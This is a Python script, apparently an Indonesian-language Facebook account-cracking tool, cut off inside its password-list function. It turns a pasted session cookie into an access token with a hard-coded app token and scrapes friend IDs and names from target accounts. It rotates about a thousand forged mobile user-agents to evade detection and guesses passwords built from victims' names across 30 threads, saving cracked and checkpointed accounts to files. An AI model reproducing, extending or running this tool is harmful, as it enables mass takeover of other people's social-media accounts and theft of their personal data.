#----------[ IMPORT-MODULE ]----------#
import os
import re
import json
import sys
import random
import time
import datetime
import requests

try:
	import bs4
	import rich
	import requests
	import stdiomask
except:
	os.system("pip install bs4")
	os.system("pip install rich")
	os.system("pip install requests")
	os.system("pip install stdiomask")

#----------[ IMPORT-RICH ]----------#	
from bs4 import BeautifulSoup as sop	
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.tree import Tree
from rich import print as prints
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn

#----------[ GLOBAL-NAME ]----------#
id, id2, uid = [],[],[]
tokene, akune = [],[]
pwpluss, pwnya = [],[]
method, ugen = [],[]
loop, ok, cp = 0,0,0

#----------[ USER-CRACK ]----------#  
for agenku in range(1000):
	rr,rc=random.randint,random.choice
	aa = str(rc(['PKQ1','QP1A','RP1A','QKQ1','PPR1','SP1A','TP1A','OPM1','RKQ1','SKQ1','TKQ1','UKQ1','01AQKQ1','QQ3A','QD4A','QQ1B','OPR1']))
	bb = (f"{str(rr(5000,299999))}")
	cc = str(rc(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020','021','022','023','024','025','026','027','028','029','030','031','032','033','034','035','036','037','039','040','041','042','043','044','045','046','047','048','049','050','051','052','053','054','055','056','057','058','059','060','061','062','063','064','065','066','067','068','069','070','071','072','073','074','075','076','077','079','080']))
	kombinasi = (f"{aa}.{bb}.{cc}")
	a = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
	b = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
	c = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
	d = (f'{str(rr(20,99))}')
	e = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
	cepong = (f"{a}{b}{c}{d}{e}")
	ip1 = str(rc(['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18']))
	ip2 = str(rc(['1','2','3','4','5','6','7','8','9','0']))
	ip3 = str(rc(['1','2','3','4','5','6','7','8','9','0']))
	iphone0 = (f"{ip1}_{ip2}_{ip3}")
	iphone1 = str(rc(["605.1.15","534.5.4","531.48.3","533.17.9","535.50.4","535.29.5","532.9","534.14.7"]))
	iphone2 = str(rc(["18F72","15E148","11A465","10B350","11A4449d","10B329","7B500","11B554a","13E233","13F69","13E238","9B206","9A334","11B651","11D167","8C148","8K2","7B314","10a523","8C148","8J2","1A543","12A405","8L1","8F190","8C148","8G4","8A293","8B117","19G82","15E148","18F72","20G75"]))
	iphone3 = str(rc(["604.1","6531.48.3","6533.18.5","6535.50.4","6535.29.5","6531.22.7","605.1"]))
	OP = str(rc(["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061",
	"CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285",
	"CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065",
	"CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]))
	RD = str(rc(["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]))
	SM = str(rc(['SM-A015M','SM-A013M','SM-A022F','SM-A025G','SM-A035M','SM-A032M','SM-A037M','SM-A045F','SM-A042F','SM-A047F','SM-A105M','SM-S102DL','SM-A107M','SM-A115AP','SM-A125U','SM-A135F','SM-A136U','SM-A145R','SM-A146U','SM-A205S','SM-A202F','SM-A207F','SM-A215U','SM-A217F','SM-A225M','SM-A226B','SM-A235M','SM-A236U','SM-A245F','SM-A305FN',
	'SM-A307GT','SM-A315F','SM-A325F','SM-A326B','SM-A336E','SM-A346B','SM-A430F','SM-A405FN','SM-E236B','SM-S367VL','SM-J400M','SM-J530F','SM-J530G','SM-J600FN','SM-J610F','SM-S767VL','SM-A202K','SM-M015G','SM-M017F','SM-M127F','SM-N950U','SM-N9300','SM-N960F','SM-9005','SM-N981B','SM-N985F','SM-N770F','SM-N970F']))
	RM = str(rc(["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]))
	ua0 = f"Mozilla/5.0 (Linux; Android {str(rr(7,15))}; {OP} Build/{cepong}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,119))}.0.{str(rr(1000,10000))}.{str(rr(10,399))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
	ua1 = f"Mozilla/5.0 (Linux; Android {str(rr(8,15))}; SAMSUNG {SM}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,99))}.0 Chrome/{str(rr(10,119))}.0.{str(rr(1000,10000))}.{str(rr(10,399))} Mobile Safari/537.36"
	ua2 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {iphone0} like Mac OS X) AppleWebKit/{iphone1} (KHTML, like Gecko) Version/{str(rr(76,119))}.0.{str(rr(3000,10000))}.{str(rr(36,299))} Mobile Mobile/{iphone2} Safari/{iphone3}'
	ua3 = f"Mozilla/5.0 (Linux; Android {str(rr(10,12))}; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(36,116))}.0.{str(rr(1000,10000))}.{str(rr(36,166))} Mobile Safari/537.36"
	ua4 = f'Mozilla/5.0 (Linux; arm_64; Android {str(rr(9,15))}; {RM}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,116))}.0.{str(rr(1000,10000))}.{str(rr(10,399))} YaBrowser/{str(rr(10,29))}.{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(36,119))}.00 SA/3 Mobile Safari/537.36'
	ua5 = f'Mozilla/5.0 (Linux; Android {str(rr(8,15))}; {RD} Build/{kombinasi}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(36,120))}.0.{str(rr(1000,10000))}.{str(rr(10,399))} Mobile Safari/537.36 Firefox-KiToBrowser/{str(rr(36,120))}.0'
	cobracan = str(rc([ua0,ua1,ua2,ua3,ua4,ua5]))
	ugen.append(cobracan)

#--------[ TAHUN-AKUN ]--------#    
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz
			
#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
P = '\x1b[1;97m'
KON='\x1b[38;5;46m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +

#----------[ HAPUS ]----------#		
def ganti_cokies():
      try:os.remove(".cyxieoncokies.txt")
      except:pass
      try:os.remove(".cyxieontoken.txt")
      except:pass
      login_cokies()
def x_shinchan(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
      	
#----------[ BANNER ]----------#
def banner():
      print(f'''{H}
$$\     $$\  $$$$$$\  $$\   $$\ $$$$$$$\  $$$$$$$$\ $$\   $$\ 
\$$\   $$  |$$  __$$\ $$$\  $$ |$$  __$$\ $$  _____|$$ |  $$ |
 \$$\ $$  / $$ /  $$ |$$$$\ $$ |$$ |  $$ |$$ |      \$$\ $$  |
  \$$$$  /  $$$$$$$$ |$$ $$\$$ |$$ |  $$ |$$$$$\     \$$$$  / 
   \$$  /   $$  __$$ |$$ \$$$$ |$$ |  $$ |$$  __|    $$  $$<  
    $$ |    $$ |  $$ |$$ |\$$$ |$$ |  $$ |$$ |      $$  /\$$\ 
    $$ |    $$ |  $$ |$$ | \$$ |$$$$$$$  |$$$$$$$$\ $$ /  $$ |
    \__|    \__|  \__|\__|  \__|\_______/ \________|\__|  \__|              {P}''')
#----------[ LOGIN-COKIES ]----------#        
def login_cokies():
    try:
        banner()
        ses = requests.Session()
        x_shinchan('──'* 25)
        your_cookies=input(f'{H}[•]{puti} Cookies {hijo}: ')
        with requests.Session() as r:
                r.headers.update({
                    'content-type': 'application/x-www-form-urlencoded',
                })
                data = {
                    'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
                    'scope': ''
                }
                response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
                code, user_code = response['code'], response['user_code']
                verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
                r.headers.pop(
                    'content-type'
                )
                r.headers.update({
                    'sec-fetch-mode': 'navigate',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
                    'sec-fetch-site': 'cross-site',
                    'Host': 'm.facebook.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'sec-fetch-dest': 'document',
                })
                response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
                if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
                    x_shinchan('──'* 25)
                    print(f"{H}⌲{mer} Cookie Invalid..", end='\r');time.sleep(3.5);exit();print("                     ", end='\r')
                else:
                    action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
                    fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
                    jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
                    data = {
                        'fb_dtsg': fb_dtsg,
                        'jazoest': jazoest,
                        'qr': 0,
                        'user_code': user_code,
                    }
                    r.headers.update({
                        'origin': 'https://m.facebook.com',
                        'referer': verification_url,
                        'content-type': 'application/x-www-form-urlencoded',
                        'sec-fetch-site': 'same-origin',
                    })
                    response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
                    if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
                        r.headers.pop(
                            'content-type'
                        );r.headers.pop(
                            'origin'
                        )
                        response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text

                        action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
                        fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
                        jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
                        scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
                        display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
                        user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
                        logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
                        auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
                        encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
                        return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
                        r.headers.update({
                            'origin': 'https://m.facebook.com',
                            'referer': response3.url,
                            'content-type': 'application/x-www-form-urlencoded',
                        })
                        data = {
                            'fb_dtsg': fb_dtsg,
                            'jazoest': jazoest,
                            'scope': scope,
                            'display': display,
                            'user_code': user_code,
                            'logger_id': logger_id,
                            'auth_type': auth_type,
                            'encrypted_post_body': encrypted_post_body,
                            'return_format[]': return_format,
                        }
                        response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
                        windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
                        r.headers.pop(
                            'content-type'
                        );r.headers.pop(
                            'origin'
                        )
                        r.headers.update({
                            'referer': 'https://m.facebook.com/',
                        })
                        response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
                        if 'Sukses!' in str(response6):
                            r.headers.update({
                                'sec-fetch-mode': 'no-cors',
                                'referer': 'https://graph.facebook.com/',
                                'Host': 'graph.facebook.com',
                                'accept': '*/*',
                                'sec-fetch-dest': 'script',
                                'sec-fetch-site': 'cross-site',
                            })
                            response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
                            access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
                            x_shinchan('──'* 25)
                            print(f"{H}[•]{hijo} {access_token}")
                            ken = open(".cyxieontoken.txt", "w").write(access_token)
                            cok = open(".cyxieoncokies.txt", "w").write(your_cookies)
                            x_shinchan('──'* 25)
                            suk = input(f'{H}[•]{puti} Tekan Enter ] ');menu()                       
                        else:
                            x_shinchan('──'* 25)
                            exit(f'{H}[•]{mer} Login gagal.. ')
    except Exception as e:
        x_shinchan('──'* 25)
        exit(f"{H}[•]{mer} Login Gagal cookie invali")
        time.sleep(3)
        ganti_cokies()		
  
#----------[ BAGIAN-MENU ]----------#            
def menu():
        try:
            token = open('.cyxieontoken.txt','r').read()
            cok = open('.cyxieoncokies.txt','r').read()
            tokene.append(token)
            try:
                baz_ganteng = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokene[0], cookies={'cookie':cok})
                useridz = json.loads(baz_ganteng.text)['id']
                username = json.loads(baz_ganteng.text)['name']
            except KeyError:
                x_shinchan('──'* 25)
                print(f"{H}[•]{mer} Akun anda terkena limit atau mode free silakan ganti cookies atau ubah ke mode data :-(")
                time.sleep(3)
                login_cokies()
        except requests.exceptions.ConnectionError:
            x_shinchan('──'* 25)
            exit(f"{H}[•]{mer} Koneksi Problem ")
        except IOError:
            x_shinchan('──'* 25)
            print(f"{H}[•]{mer} Akun anda terkena limit atau mode free silakan ganti cookies atau ubah ke mode data :-(")
            time.sleep(3)
            login_cokies()
        except IOError:
            ganti_cokies()
            x_shinchan('──'* 25)
            exit(f"{H}[•]{mer} Cokies Expired ")
        os.system('clear')
        banner()
        dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
        tgl = datetime.datetime.now().day
        bln = dic[(str(datetime.datetime.now().month))]
        thn = datetime.datetime.now().year
        ip = requests.get("https://api.ipify.org").text
        x_shinchan('──'* 25)
        print(f'NAME  : {username}')
        print(f'ID    : {useridz}')
        x_shinchan('──'* 25)
        print(f'{H}[•]{puti} 01. CRACK PUBLIK ')
        print(f'{H}[•]{puti} 02. CRACK MASSALL ')
        print(f'{H}[•]{puti} 03. CEK HASIL OK ')
        print(f'{H}[•]{puti} 04. CEK HASIL CP ')
        print(f'{H}[•]{puti} 00. GANTI PRAWAN ')
        x_shinchan('──'* 25)
        CYXIEON_GANTENG = input(f'{H}[•]{puti} Pilih : ')
        if CYXIEON_GANTENG in ['01','1']:
            crack_publik()
        if CYXIEON_GANTENG in ['02','2']:
            dump_massal()
        elif CYXIEON_GANTENG in ['04','4']:
            hasil_cp()
        elif CYXIEON_GANTENG in ['03','3']:
            hasil_ok()
        elif CYXIEON_GANTENG in ['00','0']:
            ganti_cokies()
            x_shinchan('──'* 25)
            print(f"{H}[•]{mer} Berhasil Hapus Prawan ")  
            time.sleep(3)      
            exit()    
        else:
            x_shinchan(f'\r──'* 25)
            exit(f"{H}[•]{mer} Pilihan Salah")            

#----------[ CRACK-PUBLIK  ]----------#            
def crack_publik():
	with requests.Session() as ses:
		token = open('.cyxieontoken.txt','r').read()
		cok = open('.cyxieoncokies.txt','r').read()		
		x_shinchan('──'* 25)
		a = input(f'{H}[•] {P}Masukan ID Target: ')
		try:
			params = {
			"access_token": token, 
			"fields": "name,friends.fields(id,name,birthday)"
			}
			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
			for c in b["friends"]["data"]:
				id.append(c["id"]+"|"+c["name"])
			x_shinchan('──'* 25)
			print('[•] Total ID terkumpul : {}'.format(len(id)));atur_id()
		except Exception as e:
			print(e)
	      
def dump_massal():    
 try:
  token = open('.cyxieontoken.txt','r').read()
  cok = open('.cyxieontoken.txt','r').read()
 except IOError:
     exit()
 try:
  a = int(input(f'{H}[•] {P}Mau Berapa ID? : '))
 except ValueError:
     exit()
 if a<1 or a>1000:
     exit()
 ses=requests.Session()
 bilangan = 0
 for KOTG49H in range(a):
  bilangan+=1
  Masukan = input(f'\x1b[0m{H}[•]{P} Masukkan ID Yang Ke  '+str(bilangan)+f' : ')
  uid.append(Masukan)
 for user in uid:
     try:
        head = (
        {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
        })
        if len(id) == 0:
            params = (
            {
            'access_token': token,
            'fields': "friends"
            }           
        )
        else:
            params = (
            {
            'access_token': token,
            'fields': "friends"
            }            
        )
        url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
        for xr in url['friends']['data']:
            try:
                woy = (xr['id']+'|'+xr['name'])
                if woy in id:pass
                else:id.append(woy)
            except:continue
     except (KeyError,IOError):
       pass
     except requests.exceptions.ConnectionError:
         exit()
 try:
       print("[•] Total ID terkumpul : "+str(len(id))) 
       atur_id()
 except requests.exceptions.ConnectionError:
     exit()
 except (KeyError,IOError):
  exit()
#----------[ HASIL-OK ]----------#            
def hasil_ok():
	try:vin = os.listdir('XSHIN-OK')
	except FileNotFoundError:
		x_shinchan('──'* 25)
		exit(f"{H}[•]{mer} File tidak di temukan ")
	if len(vin)==0:
		x_shinchan('──'* 25)
		exit(f"{H}[•]{mer} Tidak mempuyai file OK ")
	else:
		x_shinchan('──'* 25)
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('XSHIN-OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{H}[•]{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print(f'{H}[•]{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
		x_shinchan('──'* 25)
		geeh = input(f'{H}[•]{puti} Input file : ')
		try:geh = lol[geeh]
		except KeyError:
		    x_shinchan('──'* 25)
		    exit(f"{H}[•]{mer} Pilih yang bener :-( ")
		try:lin = open('XSHIN-OK/'+geh,'r').read().splitlines()
		except:
		    x_shinchan('──'* 25)
		    exit(f"{H}[•]{mer} File tidak di temukan ")
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{hijo}{cpkuni[0]}{puti}").add(f"{hijo}{cpkuni[1]}{puti}")
			tree.add(f"{hijo}{cpkuni[2]}{puti}")
			prints(tree)
			nocp +=1
		x_shinchan('──'* 25)
		input(f'{H}[•]{mer} Klik Enter {kun}]')
		menu()

#----------[ HASIL-CP]----------#            
def hasil_cp():
	try:vin = os.listdir('XSHIN-CP')
	except FileNotFoundError:
		x_shinchan('──'* 25)
		exit(f"{H}[•]{mer} File tidak di temukan ")
	if len(vin)==0:
		x_shinchan('──'* 25)
		exit(f"{H}[•]{mer} Tidak mempuyai file OK ")
	else:
		x_shinchan('──'* 25)
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('XSHIN-CP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{H}[•]{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print(f'{H}[•]{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
		x_shinchan('──'* 25)
		geeh = input(f'{H}[•]{puti} Input file : ')
		try:geh = lol[geeh]
		except KeyError:
		    x_shinchan('──'* 25)
		    exit(f"{H}[•]{mer} Pilih yang bener :-( ")
		try:lin = open('XSHIN-CP/'+geh,'r').read().splitlines()
		except:
		    x_shinchan('──'* 25)
		    exit(f"{H}[•]{mer} File tidak di temukan ")
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{kun}{cpkuni[0]}{puti}").add(f"{kun}{cpkuni[1]}{puti}")
			prints(tree)
			nocp +=1
		x_shinchan('──'* 25)
		input(f'{H}[•]{mer} Klik Enter {kun}]')
		menu()
																		
#----------[ MENU-IDZ ]----------#		
def atur_id():
     rr = random.randint
     for khusus_random in id:
            cyxieon_id = rr(0,len(id2))
            id2.insert(cyxieon_id, khusus_random)
     atur_method()
     
#----------[ MENU-METODE ]----------#
def atur_method():
	x_shinchan('──'* 25)
	#print(f'{H}[•]{puti} 01. B-API ')
	print(f'{H}[•]{puti} 01. validate')
	#print(f'{H}⌲{puti} 03. Mobile validate all region ')      
	x_shinchan('──'* 25) 
	CYXIEON_METHODE = input(f'{H}[•]{puti} Pilih Metode : ')
	if CYXIEON_METHODE in ['1','01']:
	   method.append('validate')  
	#elif CYXIEON_METHODE in ['1','01']:
	   #method.append('B-API')       
	#elif CYXIEON_METHODE in ['3','03']:
	   #method.append('kontol')
	else:
		method.append('validate')
	x_shinchan('──'* 25)
	pwplus=input(f'{H}[•]{P} add Password manual Y/T :{P} ')
	x_shinchan('──'* 25)
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(f'{H}[•]{P} Masukan sandi :  ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
	    pwpluss.append('no')
	passwordlist()
	
#----------[ BAGIAN-WORDLIST ]----------#	
def passwordlist():
	global prog,des
	x_shinchan('──'* 25)
	print(f'            {puti} {H}SEDANG MENGEWE JANDA{puti}           ')
	x_shinchan('──'* 25)
	with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwx = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
						
				else:
					if len(frs)<3:
						pwx.append(nmf)
